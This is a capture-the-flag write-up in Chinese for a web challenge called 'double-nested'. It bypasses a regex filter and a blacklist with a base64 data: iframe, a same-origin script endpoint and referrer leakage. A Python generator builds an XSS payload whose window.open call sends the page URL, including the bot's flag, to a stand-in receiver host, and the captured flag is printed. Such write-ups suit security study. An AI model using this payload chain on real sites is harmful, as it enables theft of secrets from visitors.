# double-nested

## 题目简述

主页把参数 `i` 经自定义黑名单后以 `{{ i|safe }}` 注入 HTML，并设置 CSP：脚本只能来自同源，但允许 `data:` iframe。管理员机器人会访问“提交 URL + flag”，因此目标是让嵌套页面取得完整父页面 URL，再把其中追加的 flag 发往接收端。

## 解题过程

过滤函数先执行：

```python
re.sub(r"^(.*?=){,3}", "", value)
```

它会从开头最多吃掉三个以 `=` 结尾的最短片段。给每一层待过滤内容加前缀 `===`，正好让正则只删除这三个等号，后面的 HTML 属性或 JavaScript 赋值便能完整保留。

外层不能直接出现 `script`，所以注入一个内容经过 Base64 编码的 `data:text/html` iframe；CSP 的 `frame-src data:` 允许它加载。iframe 内再引用同源 `/gen?query=...`，该接口把过滤后的参数以 `application/javascript` 返回，符合 `script-src 'self'`。JavaScript 用 `window['d'+'ocument']` 避开连续的 `document` 黑名单，并由 `referrerpolicy='unsafe-url'` 保留父页面完整 URL。

下面的生成器会同时模拟两层过滤；若 Base64 偶然形成黑名单片段，就自动增加无害空格后重试：

```python
import base64
import re
from urllib.parse import quote

ORIGIN = "https://double-nested.tjc.tf"
HOOK = "https://your-receiver.example/?q="

def survives(value):
    value = re.sub(r"^(.*?=){,3}", "", value)
    forbidden = ["script", "http://", "&", "document", '"']
    return (
        not any(word in value.lower() for word in forbidden)
        and value.lower().count("on") == value.lower().count("location")
    )

javascript = (
    "===window.open('" + HOOK
    + "'+window['d'+'ocument'].referrer)"
)
assert survives(javascript)

for padding in range(1000):
    inner = (
        "<script src='" + ORIGIN + "/gen?query="
        + quote(javascript, safe="") + "'></script>"
        + " " * padding
    )
    encoded = base64.b64encode(inner.encode()).decode()
    outer = (
        "===<iframe src='data:text/html;base64," + encoded
        + "' referrerpolicy='unsafe-url'></iframe>"
    )
    if survives(outer):
        print(ORIGIN + "/?i=" + quote(outer, safe=""))
        break
else:
    raise RuntimeError("未找到通过外层过滤的编码")
```

把输出 URL 交给管理员机器人。机器人调用 `page.goto(url + flag)`，iframe 的 `document.referrer` 因而包含被追加的 flag；接收端最终得到：

```text
tjctf{1t_w4s_4ll_scr1pt3d413a98u0}
```

## 方法总结

- 核心技巧：利用正则预处理的三等号错位、`data:` iframe、同源动态 JavaScript 和 referrer 泄露串成两层 XSS。
- 识别信号：`safe` 模板输出、字符串黑名单、允许 `data:` frame 的 CSP、返回 JavaScript MIME 的同源接口，以及把秘密拼到访问 URL 的管理员机器人。
- 复用要点：防护必须在正确的解析阶段做上下文编码；CSP 应避免不必要的 `data:` frame，并且秘密不能放进会成为 referrer、历史记录或日志的 URL。
